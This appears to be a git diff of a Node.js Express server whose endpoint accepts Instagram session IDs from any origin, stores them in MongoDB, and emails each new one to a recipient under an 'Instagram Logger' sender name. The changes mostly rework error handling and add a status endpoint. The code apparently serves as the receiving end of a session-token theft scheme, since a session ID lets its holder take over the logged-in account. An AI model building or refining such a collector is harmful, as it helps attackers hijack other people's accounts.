@@ -6,22 +6,18 @@ const cors = require('cors');
 
 const app = express();
 
-// Middleware - MUST come before routes
+// Middleware
 app.use(cors());
-app.use(express.json()); // This is the crucial line for body parsing
+app.use(express.json());
 
-// Improved MongoDB connection
-mongoose.connect(process.env.MONGODB_URI, {
+// MongoDB Connection
+mongoose.connect(process.env.MONGODB_URI || "mongodb://127.0.0.1:27017/tracking", {
   useNewUrlParser: true,
   useUnifiedTopology: true,
-  serverSelectionTimeoutMS: 30000, // 30 seconds timeout
-  socketTimeoutMS: 30000
+  serverSelectionTimeoutMS: 30000
 })
 .then(() => console.log('✅ MongoDB connected'))
-.catch(err => {
-  console.error('❌ MongoDB connection error:', err);
-  process.exit(1); // Exit if DB connection fails
-});
+.catch(err => console.error('❌ MongoDB connection error:', err));
 
 // Session Model
 const sessionSchema = new mongoose.Schema({
@@ -30,90 +26,68 @@ const sessionSchema = new mongoose.Schema({
 });
 const Session = mongoose.model('Session', sessionSchema);
 
-// Email Transport
-const transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS
-  }
-});
+// Email Transport with better error handling
+let transporter;
+try {
+  transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: process.env.EMAIL_USER,
+      pass: process.env.EMAIL_PASSWORD
+    }
+  });
+  console.log('✅ Email transporter initialized');
+} catch (emailError) {
+  console.error('❌ Email transport error:', emailError.message);
+}
 
-// API Endpoint - WITH PROPER ERROR HANDLING
+// API Endpoint
 app.post('/api/sessions', async (req, res) => {
   try {
-    // Validate request body exists
-    if (!req.body || typeof req.body !== 'object') {
-      return res.status(400).json({ 
-        success: false,
-        error: 'Invalid request body' 
-      });
-    }
-
-    // Destructure with fallback
     const { sessionId } = req.body || {};
 
-    // Validate sessionId exists
     if (!sessionId) {
-      return res.status(400).json({ 
-        success: false,
-        error: 'sessionId is required in request body' 
-      });
+      return res.status(400).json({ error: 'sessionId is required' });
     }
 
-    // Try to create new session
     try {
       const newSession = await Session.create({ sessionId });
-
-      // Send email for new sessions
-      await transporter.sendMail({
-        to: process.env.RECIPIENT_EMAIL,
-        subject: 'New Instagram Session',
-        text: `Session ID: ${sessionId}`,
-        html: `<p>New session detected: <code>${sessionId}</code></p>`
-      });
+      
+      // Only try to send email if transporter initialized
+      if (transporter) {
+        await transporter.sendMail({
+          from: `"Instagram Logger" <${process.env.EMAIL_USER}>`,
+          to: process.env.RECIPIENT_EMAIL,
+          subject: 'New Instagram Session',
+          text: `Session ID: ${sessionId}`,
+          html: `<p>New session: <code>${sessionId}</code></p>`
+        });
+      }
 
       return res.json({ 
         success: true,
-        isNew: true,
-        message: 'New session recorded'
+        message: 'Session recorded' + (transporter ? ' and email sent' : '')
       });
 
     } catch (dbError) {
-      if (dbError.code === 11000) { // Duplicate key error
-        return res.json({ 
-          success: true,
-          isNew: false,
-          message: 'Session already exists'
-        });
+      if (dbError.code === 11000) {
+        return res.json({ success: false, message: 'Session already exists' });
       }
       throw dbError;
     }
 
   } catch (error) {
     console.error('❌ Server error:', error);
-    return res.status(500).json({ 
-      success: false,
-      error: 'Internal server error' 
-    });
+    return res.status(500).json({ error: 'Internal server error' });
   }
 });
 
-// Health check endpoint
+// Health endpoint
 app.get('/', (req, res) => {
   res.json({ 
-    status: 'Server is running',
-    endpoints: {
-      sessionTracking: 'POST /api/sessions'
-    }
-  });
-});
-
-// Handle 404
-app.use((req, res) => {
-  res.status(404).json({ 
-    success: false,
-    error: 'Endpoint not found' 
+    status: 'Running',
+    db: mongoose.connection.readyState === 1 ? 'Connected' : 'Disconnected',
+    email: transporter ? 'Configured' : 'Not configured'
   });
 });
 
